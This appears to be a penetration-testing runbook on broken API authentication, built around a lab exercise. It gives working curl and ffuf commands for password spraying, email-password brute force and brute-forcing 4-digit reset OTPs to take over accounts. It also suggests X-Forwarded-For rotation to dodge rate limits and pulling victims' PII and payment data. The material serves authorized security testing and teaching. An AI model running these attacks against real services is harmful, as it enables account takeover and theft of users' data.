# Batch 02 — Broken Authentication (operator)

## FILL IN (any API)

```bash
BASE="https://api.example.com"
LOGIN_PATH="/api/v1/authentication/.../sign-in"
EMAIL="lowpriv@example.com"
PASS="..."
WL=/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt
# From OAS: password update, reset, OTP, MFA paths
UPDATE_PATH="/api/v1/.../current-user"          # PATCH profile/password if any
RESET_OTP_PATH="/api/v1/.../passwords/resets/email-otps"
RESET_PATH="/api/v1/.../passwords/resets"
FAIL_STRING="Invalid Credentials"               # capture from real fail
```

## GOAL
Show authentication can be bypassed or abused: weak secrets, no rate limit, weak OTP, token issues → **account takeover**.

## TIME
1–2 hours

## YOU NEED
- At least one valid low-priv account **or** register  
- Wordlist; optional second target emails  
- curl + ffuf; pinchtab/gori optional  

---

## WHY (first principles)

**Authentication** = prove identity.  
**Broken Authentication** = attacker becomes the victim without legitimately owning their secret (or by abusing login machinery).

Common CWE-307 shape:

1. Weak password rules  
2. Unlimited login attempts  
3. Short OTP / guessable recovery  

Flow: inventory identities → spray passwords **or** brute OTP → use session → sensitive data.

Not BOLA: you are not swapping object ids under your own session; you **are** the victim after secret compromise.

See [00-authz-authn-compare.md](./00-authz-authn-compare.md).

---

## DO THIS (generic)

### 1) Map auth surfaces (OAS / traffic)

```text
sign-in, sign-up, refresh, logout
password update, forgot password, OTP email/SMS
MFA verify, security questions
```

```bash
curl -sk -o openapi.json "$BASE/swagger/v1/swagger.json"
grep -iE 'sign-in|password|otp|auth|token|reset' openapi.json | head -40
```

### 2) Login + baseline

```bash
curl -sk -X POST "$BASE$LOGIN_PATH" \
  -H 'Content-Type: application/json' \
  -d "{\"Email\":\"$EMAIL\",\"Password\":\"$PASS\"}"
# Extract JWT/token — field names from OAS (jwt, access_token, token)
```

```bash
curl -sk -H "Authorization: Bearer $JWT" "$BASE/api/v1/.../current-user"
curl -sk -H "Authorization: Bearer $JWT" "$BASE/api/v1/.../roles/current-user"
```

### 3) Password policy (if update exists)

```bash
# Send deliberately weak passwords; record server errors
# Try: short, only digits, common (password, 123456), long random
```

Document min length, complexity, blocklist, max length (tiny max = dead entropy).

### 4) Capture fail response for automation

```bash
curl -sk -X POST "$BASE$LOGIN_PATH" \
  -H 'Content-Type: application/json' \
  -d '{"Email":"nouser@x.com","Password":"wrong"}'
# Note body + status for ffuf -fr / matcher
```

### 5) Build identity list for spray

Sources: registration, `GetAll` users/customers (if role allows), leaks, provided scope list.

```bash
# emails.txt one per line
```

### 6) Password spray / brute (authorized only)

**Per-account (reliable):**

```bash
ffuf -w "$WL" \
  -u "$BASE$LOGIN_PATH" \
  -X POST -H "Content-Type: application/json" \
  -d "{\"Email\":\"TARGET@example.com\",\"Password\":\"FUZZ\"}" \
  -fr "$FAIL_STRING" -t 50 -mc all
```

**Email × password (if dual wordlists work):**

```bash
ffuf -w emails.txt:EMAIL -w "$WL:PASS" -mode clusterbomb \
  -u "$BASE$LOGIN_PATH" \
  -X POST -H "Content-Type: application/json" \
  -d '{"Email":"EMAIL","Password":"PASS"}' \
  -fr "$FAIL_STRING" -t 50
# If second wordlist ignored by ffuf build → loop per email
```

Watch for **429/lockout/captcha**. None under load → CWE-307 style finding.

### 7) OTP / recovery brute (if password spray fails)

```bash
# Request OTP
curl -sk -X POST "$BASE$RESET_OTP_PATH" \
  -H 'Content-Type: application/json' \
  -d '{"Email":"victim@example.com"}'

# Brute short OTP (e.g. 4-digit)
seq -w 0 9999 > otp-4digit.txt
ffuf -w otp-4digit.txt \
  -u "$BASE$RESET_PATH" \
  -X POST -H "Content-Type: application/json" \
  -d '{"Email":"victim@example.com","OTP":"FUZZ","NewPassword":"NewPass123!"}' \
  -fr 'false' -t 50 -mc all
# Tune -fr to real failure body
```

Then login as victim; pull PII/payment/admin data for impact.

### 8) Operator log

```text
Weak policy: yes/no (detail)
Rate limit login: yes/no
Rate limit OTP: yes/no
ATO accounts:
Impact endpoints:
```

---

## EDGE CASES (always)

| # | Test |
|---|------|
| E1 | Failures until lockout / captcha |
| E2 | `X-Forwarded-For` rotation vs IP limit |
| E3 | User enumeration (different errors/timing) |
| E4 | Password max length too small |
| E5 | No common-password blocklist |
| E6 | OTP length/charset/TTL/reuse |
| E7 | OTP request without auth for any email |
| E8 | MFA skip after reset |
| E9 | JWT alg/exp/role after login |
| E10 | Default credentials |
| E11 | Credential stuffing with pairs |
| E12 | gori/Burp Intruder on login+OTP |

---

## Evidence comment (paste)

```text
Class: Broken Authentication (API2 / CWE-307 or policy weakness).
[Login|OTP] accepts unlimited attempts / weak secrets.
Evidence: fail body sample; spray/OTP success (redact secrets); no 429 under ~N rps.
Not BOLA: obtained valid victim session via secret abuse, not object-id swap under our account.
```

## Prevention

Rate-limit + lockout on login/OTP; strong password policy; MFA; long OTPs, short TTL, single-use.

## IF / THEN

| See | Do |
|-----|-----|
| Weak policy | Document + prioritize spray |
| No rate limit | High automation risk finding |
| OTP short | Prefer OTP path |
| ATO + PII/payments | Critical impact |

## NEXT
→ [03-bopla-ede-mass-assignment.md](./03-bopla-ede-mass-assignment.md)

---

## WORKED EXAMPLE (lab only — not the runbook)

Inlanefreight customer auth lab. Full proof: `../notes/inlanefreight-broken-auth/`.

| Item | Example |
|------|---------|
| Login | `POST /api/v1/authentication/customers/sign-in` |
| Fail | `Invalid Credentials` |
| Policy | min 6; `123456` accepted on update |
| Spray hit | Isabella / `qwerasdfzxcv` (xato-10k) |
| OTP | 4-digit email OTP brute → reset → login |
| Impact | payment-options as victim |
| Evidence | `notes/inlanefreight-broken-auth/evidence/` |
